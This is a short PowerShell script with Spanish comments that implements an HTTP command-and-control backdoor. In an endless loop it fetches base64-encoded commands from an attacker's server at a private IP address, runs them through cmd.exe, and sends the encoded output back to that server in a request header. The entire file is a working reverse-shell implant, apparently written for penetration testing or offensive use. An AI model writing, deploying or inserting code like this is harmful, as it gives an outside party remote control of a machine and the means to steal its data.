while (1)
{
<#direccion URL del atacante#>
$server = "http://192.168.56.1/";
$req = [System.Net.HttpWebRequest]::Create($server);
<#
#############################################################
#                   Proxy Configuration                     #
#############################################################
#$proxy=[System.Net.WebRequest]::GetSystemWebProxy();
#$proxy.Credentials=[System.Net.CredentialCache]::DefaultCredentials;
#$req.proxy = $proxy
#############################################################
#>
$res = $req.GetResponse();
$cmdcoded = $res.GetResponseHeader("CMD");
<#decodifica el comando cmd enviado en base64#>
$cmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cmdcoded));
<#crea y ejecuta un proceso cmd.exe con los comandos enviados por el atacante#>
$psi= New-Object System.Diagnostics.ProcessStartInfo;
$psi.FileName = "cmd.exe";
$psi.RedirectStandardOutput = $true;
$psi.RedirectStandardInput = $true;
$psi.RedirectStandardError = $true;
$psi.UseShellExecute = $false;
$process = New-Object System.Diagnostics.Process;
$process.StartInfo = $psi;
$process.Start();
$process.StandardInput.WriteLine($cmd);
$process.StandardInput.WriteLine("exit");
$standardOut = $process.StandardOutput.ReadToEnd();
$process.WaitForExit();
<#codifica la respuesta en base64#>
$rpta=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($standardOut));
$res.Close();
<#inicia otra petición para enviar la respuesta al atacante#>
$req2 = [System.Net.HttpWebRequest]::Create($server);
$req2.Headers.add('RPTA',$rpta);
$res2 = $req2.GetResponse();
$res2.Close();
}
